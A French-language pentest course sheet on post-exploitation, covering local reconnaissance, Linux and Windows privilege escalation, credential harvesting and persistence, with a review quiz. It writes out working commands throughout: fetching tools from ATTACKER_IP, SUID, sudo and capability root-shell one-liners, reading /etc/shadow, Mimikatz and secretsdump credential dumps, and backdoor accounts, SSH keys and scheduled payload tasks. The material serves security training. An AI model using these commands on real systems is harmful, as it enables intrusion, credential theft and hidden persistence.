---
aliases:
  - POST-EXPLOITATION & PRIVILEGE ESCALATION
  - 01-18 | POST-EXPLOITATION & PRIVILEGE ESCALATION
archetype: cour
module: GEN (Culture G√©n√©rale & Hors Cursus)
cssclasses:
  - max
tags:
  - pentest/post-exploitation
  - privileges/elevation
  - persistance
  - authentification/credentials
  - red-teaming
  - audit-securite
  - pentest/reconnaissance
  - vulnerabilite/exploitation
  - microsoft/active-directory
  - shell
  - outil/linpeas
  - outil/winpeas
  - outil/mimikatz
  - outil/impacket
  - outil/pspy
  - outil/wmiexec
  - outil/psexec
  - outil/netcat
  - outil/socat
  - outil/python-http-server
  - vulnerabilite/suid
  - vulnerabilite/cron-job
  - vulnerabilite/linux-capabilities
  - vulnerabilite/nfs-root-squash
  - vulnerabilite/sudoers
  - artefact/shadow
  - artefact/sam
  - artefact/lsa
  - commande/id
  - commande/uname
  - commande/lsb_release
  - commande/sudo
  - commande/whoami
  - commande/netstat
  - commande/ls
  - commande/systeminfo
  - commande/ipconfig
  - commande/net-user
  - commande/net-localgroup
  - commande/wget
  - commande/chmod
  - commande/find
  - operating-system/linux
  - operating-system/windows
---

# 01-18 | POST-EXPLOITATION & PRIVILEGE ESCALATION

> [!goal] Objectifs P√©dagogiques
> √Ä la fin de cette fiche, je dois √™tre capable de :
> 1.  R√©aliser un audit local de la machine compromise.
> 2.  Utiliser les outils de *privilege escalation* automatique (*LinPEAS* / *WinPEAS*).
> 3.  Exploiter les *SUID*, les *cron jobs* et les *capabilities Linux*.
> 4.  Exploiter les services vuln√©rables sur Windows.
> 5.  Extraire les *credentials* (Linux `shadow`, Windows `SAM`/`LSA`, *Mimikatz*).
> 6.  Mettre en place une *persistence* "red team" contr√¥l√©e.
> 7.  Pr√©parer l'escalade vers *Domain Admin* (Module 11).

## üìù Synth√®se du Cours

Ce module de niveau *Interm√©diaire* √† *Avanc√©* vise √† transformer un acc√®s utilisateur simple en un acc√®s *root* sous Linux ou *Administrator* sous Windows, puis √† collecter des *credentials* et assurer une *persistence* sur le syst√®me compromis.

### 1. Pr√©-requis et Outils Essentiels

Pour aborder ce module, il est imp√©ratif d'avoir valid√© les modules 1 √† 9 et d'avoir d√©j√† un *shell* fonctionnel sur au moins une machine du r√©seau (Linux et/ou Windows). Une liste d'outils sp√©cifiques doit √™tre t√©l√©charg√©e :

*   **`linpeas.sh` / `winpeas.exe`** : Des scripts d'audit automatis√©s pour identifier les vuln√©rabilit√©s d'escalade de privil√®ges sur Linux et Windows respectivement.
*   **`mimikatz.exe`** (LAB uniquement) : Un outil puissant pour l'extraction de *credentials* sur les syst√®mes Windows.
*   **`Scripts Impacket`** : Une collection de scripts Python pour l'interaction avec des protocoles r√©seau, notamment pour le *dump* de *SAM* et *LSA*.

Les outils suivants seront √©galement utilis√©s :

| Outil                       | Usage                                  |
| :-------------------------- | :------------------------------------- |
| *LinPEAS*                   | Analyse de l'escalade de privil√®ges Linux |
| *WinPEAS*                   | Analyse de l'escalade de privil√®ges Windows |
| *Mimikatz*                  | Extraction de *credentials* Windows    |
| *Impacket* (`secretsdump`)  | *Dump* des bases de donn√©es `SAM` et `LSA` |
| `pspy`                      | Observateur de processus Linux         |
| `wmiexec`/`psexec`          | Ex√©cution de commandes √† distance Windows |
| `netcat`/`socat`            | *Reverse shells* et *pivoting*         |

### 2. Check-in Post-exploitation : Audit et Reconnaissance Initiale

L'objectif initial apr√®s avoir obtenu un acc√®s est de comprendre la machine compromise avant d'agir. Cette √©tape d'*audit local* permet d'identifier l'OS, les services en cours d'ex√©cution, les privil√®ges actuels de l'utilisateur et les comptes pr√©sents.

**Sous Linux, les commandes cl√©s incluent :**
*   `id` : Affiche l'identit√© de l'utilisateur.
*   `uname -a` : Informations sur le noyau du syst√®me.
*   `lsb_release -a` : Distribution Linux et informations de version.
*   `sudo -l` : Liste les commandes que l'utilisateur peut ex√©cuter avec `sudo`.
*   `whoami` : Affiche le nom d'utilisateur effectif.
*   `netstat -tulppn` : Liste les connexions r√©seau actives, les ports en √©coute et les processus associ√©s.
*   `ls -la /home` : Liste le contenu des r√©pertoires personnels pour identifier d'autres utilisateurs.

**Sous Windows (via *Meterpreter* ou un *shell*) :**
*   `whoami` : Affiche l'utilisateur courant.
*   `systeminfo` : Affiche des informations d√©taill√©es sur le syst√®me d'exploitation et la configuration mat√©rielle.
*   `ipconfig /all` : Affiche la configuration r√©seau d√©taill√©e.
*   `net user` : Liste les utilisateurs locaux.
*   `net localgroup administrators` : Liste les membres du groupe *Administrators* local.
*   `netstat -ano` : Affiche les connexions r√©seau, les ports et les IDs de processus (PIDs).

### 3. Escalade de Privil√®ges sous Linux

L'escalade de privil√®ges sous Linux vise √† passer d'un utilisateur standard √† l'utilisateur *root*.

#### A. Utilisation de *LinPEAS*

*LinPEAS* est un script shell qui automatise la recherche de vuln√©rabilit√©s. Pour le t√©l√©charger sur la cible depuis une machine d'attaquant (Kali par exemple) :
1.  Sur Kali : `python3 -m http.server 8000`
2.  Sur la machine Linux victime : `wget http://ATTACKER_IP:8000/linpeas.sh`
3.  Rendre le script ex√©cutable : `chmod +x linpeas.sh`
4.  Lancer *LinPEAS* : `./linpeas.sh`

*LinPEAS* recherche diverses anomalies telles que les permissions anormales, les binaires *SUID root*, les *cron jobs*, les services √† privil√®ges, les mots de passe en clair, les *capabilities Linux*, les configurations *NFS root squash* et les probl√®mes li√©s aux fichiers `sudoers`.

#### B. M√©thodes Cl√©s Linux

*   **SUID binaries (Set User ID)** : Les fichiers avec le bit *SUID* d√©fini s'ex√©cutent avec les privil√®ges du propri√©taire du fichier, souvent *root*.
    *   Trouver les fichiers *SUID* : `find / -perm -4000 2>/dev/null`
    *   Exemples de binaires *SUID* vuln√©rables : `/usr/bin/nmap`, `/usr/bin/vim`, `/usr/bin/find`, `/usr/bin/python`.
    *   Exploitation exemple avec `find` : `/usr/bin/find . -exec /bin/sh -p \; -quit` permet d'obtenir un *shell root*.

*   **Cron Jobs mal s√©curis√©s** : Des t√¢ches planifi√©es ex√©cut√©es par *root* peuvent √™tre modifi√©es si les permissions du script ou du r√©pertoire sont faibles.
    *   Examiner les *cron jobs* : `cat /etc/crontab`
    *   L'exploitation consiste √† remplacer un script ex√©cut√© par *root* avec un *payload* malveillant.

*   **Sudo sans mot de passe** : Un utilisateur peut √™tre autoris√© √† ex√©cuter certaines commandes avec `sudo` sans avoir √† entrer de mot de passe.
    *   V√©rifier les permissions *sudo* : `sudo -l`
    *   Exemple d'exploitation avec Python : `sudo python3 -c 'import pty; import os; os.system("/bin/bash")'` permet d'obtenir un *shell root* si Python est autoris√©.

*   **Capabilities Linux** : Elles divisent les privil√®ges *root* en unit√©s plus petites. Une *capability* mal configur√©e peut √™tre exploit√©e.
    *   Lister les *capabilities* : `getcap -r / 2>/dev/null`
    *   Exemple typique : `/usr/bin/python3 = cap_setuid` permet √† Python de modifier l'UID d'un processus.
    *   Exploitation : `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` permet d'obtenir un *shell root*.

### 4. Escalade de Privil√®ges sous Windows

L'objectif est d'obtenir des privil√®ges *Administrator* sur un syst√®me Windows.

#### A. Utilisation de *WinPEAS*

Comme *LinPEAS*, *WinPEAS* est un outil d'automatisation.
1.  T√©l√©charger *WinPEAS* depuis une machine d'attaquant : `certutil -urlcache -f http://ATTACKER_IP/WinPEAS.exe winpeas.exe`
2.  Lancer *WinPEAS* : `winpeas.exe`

*WinPEAS* d√©tecte les contournements *UAC*, les services vuln√©rables, le *DLL hijacking*, les mots de passe en clair, les permissions anormales, les logiciels vuln√©rables et les *tokens* exploitables.

#### B. M√©thodes Cl√©s Windows

*   **Services mal configur√©s** : Certains services Windows s'ex√©cutent avec des privil√®ges √©lev√©s et peuvent avoir des permissions faibles sur leur binaire ou leur configuration.
    *   Lister les services : `sc query state= all`
    *   Identifier les services avec des droits d'√©criture pour l'utilisateur courant : `accesschk.exe /accepteula -uwvcqv userName *` (n√©cessite l'outil *AccessChk* de *Sysinternals*).
    *   Exploitation : Remplacer le binaire d'un service par un *payload* malveillant.

*   **UAC Bypass** (LAB uniquement) : Le *User Account Control* peut parfois √™tre contourn√© pour ex√©cuter des processus avec des privil√®ges √©lev√©s sans notification.
    *   Exemple : `powershell -ExecutionPolicy Bypass` peut √™tre une premi√®re √©tape.

*   **Mise √† niveau via *AlwaysInstallElevated*** : Si cette politique est activ√©e, un utilisateur non privil√©gi√© peut installer des fichiers *.msi* avec des privil√®ges *SYSTEM*.
    *   V√©rifier si activ√© :
        `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
        `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
    *   Exploitation : `msiexec /quiet /qn /i payload.msi` o√π `payload.msi` contient un ex√©cutable malveillant.

*   **Token Impersonation** (LAB -> Windows Server) : Certains privil√®ges, comme `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`, permettent √† un processus d'impersoner un autre utilisateur ou de voler son *token* de s√©curit√©.
    *   V√©rifier les privil√®ges : `whoami /priv`
    *   Exploitation : Des outils comme *Juicy Potato* ou *PrintSpoofer* peuvent exploiter ces privil√®ges pour √©lever les droits.

### 5. R√©colte de Cr√©dentials (Credential Harvesting)

Une fois les privil√®ges √©lev√©s, l'extraction de *credentials* permet d'√©tendre l'acc√®s √† d'autres syst√®mes.

**Sous Linux :**
*   **Lecture de `/etc/shadow`** : Si l'attaquant est *root*, il peut lire le fichier `/etc/shadow` qui contient les *hashes* de mot de passe des utilisateurs.
    *   `cat /etc/shadow`
*   **Extraction des cl√©s SSH** : Les cl√©s priv√©es SSH stock√©es dans le r√©pertoire `~/.ssh` peuvent √™tre utilis√©es pour acc√©der √† d'autres syst√®mes o√π l'utilisateur a une cl√© publique autoris√©e.
    *   `ls -la ~/.ssh`

**Sous Windows :**
*   **Dump SAM & LSA avec *Impacket*** : L'outil `secretsdump.py` d'*Impacket* peut extraire les *hashes NTLM* des bases de donn√©es `SAM` (Security Account Manager) et `LSA` (Local Security Authority) qui stockent les informations d'identification locales.
    *   `secretsdump.py user:pass@192.168.56.6`
*   **Mimikatz** (LAB uniquement) : Cet outil est capable d'extraire des *Kerberos tickets*, des *hashes NTLM* et m√™me des mots de passe en clair de la m√©moire du processus `lsass.exe`.
    *   `privilege::debug`
    *   `sekurlsa::logonpasswords`

### 6. Strat√©gies de Persistance (LAB uniquement)

La *persistence* permet de maintenir un acc√®s √† la machine compromise m√™me apr√®s un red√©marrage ou la d√©connexion de l'attaquant.

**Sous Linux :**
*   **Cr√©ation d'un utilisateur administrateur** :
    *   `useradd attacker -m -G sudo`
    *   `echo "attacker:password" | chpasswd`
*   **Backdoor SSH (cl√© publique)** : Ajouter une cl√© publique d'attaquant au fichier `authorized_keys` d'un utilisateur permet un acc√®s SSH sans mot de passe.
    *   `mkdir ~/.ssh`
    *   `echo "cl√©_publique" >> ~/.ssh/authorized_keys`

**Sous Windows :**
*   **Cr√©ation d'un compte local** :
    *   `net user attacker Password123! /add`
    *   `net localgroup administrators attacker /add`
*   **T√¢che planifi√©e persistante** : Cr√©er une t√¢che planifi√©e qui ex√©cute un *payload* au d√©marrage du syst√®me ou √† intervalles r√©guliers.
    *   `schtasks /create /sc onstart /tn updater /tr "C:\payload.exe"`

### 7. Fiche de Post-Exploitation (Synth√®se du Rapport)

Une fois la phase de post-exploitation termin√©e, il est crucial de documenter les findings. Une fiche de post-exploitation typique pourrait inclure :

| IP            | OS      | M√©thode Privesc      | Outil    | Cr√©dentials obtenus | Niveau final | Notes          |
| :------------ | :------ | :------------------- | :------- | :------------------ | :----------- | :------------- |
| 192.168.56.20 | Linux   | SUID / nmap          | LinPEAS  | root                | High         | pivot possible |
| 192.168.56.6  | Windows | Services vuln√©rables | WinPEAS  | Administrator       | High         | dump LSA OK    |

## üß† Carte Mentale / Sch√©ma
```mermaid
graph TD
    A["Post-exploitation & Privilege Escalation"] --> B["1. Audit Local (Check-in)"]
    B --> C{"2. Escalade de Privil√®ges"}
    C --> D["Linux Privesc"]
    C --> E["Windows Privesc"]
    D --> F["3. Credential Harvesting (Linux)"]
    E --> G["3. Credential Harvesting (Windows)"]
    F --> H["4. Persistence (Linux)"]
    G --> I["4. Persistence (Windows)"]
    H --> J["5. Rapport (Fiche de Post-exploitation)"]
    I --> J
    J --> K["Pr√©paration au Lateral Movement (Module 11)"]

    D --- LinPEAS["LinPEAS, SUID, Cron, Sudo, Capabilities"]
    E --- WinPEAS["WinPEAS, Services, UAC, AlwaysInstallElevated, Token Impersonation"]
    F --- ShadowSSH["/etc/shadow, ~/.ssh"]
    G --- MimikatzImpacket["Mimikatz, Impacket (SAM/LSA)"]
    H --- UserAddSSH["useradd, ~/.ssh/authorized_keys"]
    I --- NetUserSchtasks["net user, schtasks"]
```

## ‚ùì Quiz de R√©vision (Active Recall)
> [!question] Question 1
> Quels sont les deux outils automatis√©s principaux pour la recherche de vuln√©rabilit√©s d'escalade de privil√®ges sur Linux et Windows ?
> > [!success]- R√©ponse
> > *LinPEAS* pour Linux et *WinPEAS* pour Windows.

> [!question] Question 2
> Mentionnez trois m√©thodes cl√©s pour l'escalade de privil√®ges sous Linux.
> > [!success]- R√©ponse
> > 1.  Exploitation des *SUID binaries* (par exemple, `find`, `nmap`).
> > 2.  Modification de *Cron Jobs* mal s√©curis√©s.
> > 3.  Utilisation de commandes *Sudo* sans mot de passe.
> > 4.  Exploitation des *Capabilities Linux*.

> [!question] Question 3
> Quel outil est couramment utilis√© sous Windows pour extraire les *credentials* de la m√©moire du syst√®me, et quels types d'informations peut-il r√©cup√©rer ?
> > [!success]- R√©ponse
> > *Mimikatz*. Il peut r√©cup√©rer des *Kerberos tickets*, des *hashes NTLM* et des mots de passe en clair.

> [!question] Question 4
> Comment un attaquant peut-il √©tablir une *persistence* simple sous Linux apr√®s avoir obtenu les privil√®ges *root* ? Donnez deux exemples.
> > [!success]- R√©ponse
> > 1.  Cr√©ation d'un nouvel utilisateur administrateur avec `useradd` et `chpasswd`.
> > 2.  Ajout de la cl√© publique de l'attaquant au fichier `~/.ssh/authorized_keys` d'un utilisateur pour un acc√®s SSH *backdoor*.

> [!question] Question 5
> Quelle est l'importance de la commande `whoami /priv` sous Windows lors de la phase de post-exploitation ?
> > [!success]- R√©ponse
> > La commande `whoami /priv` permet de lister les privil√®ges d√©tenus par l'utilisateur courant, ce qui est crucial pour identifier des vecteurs d'escalade de privil√®ges potentiels comme `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` pour le *Token Impersonation*.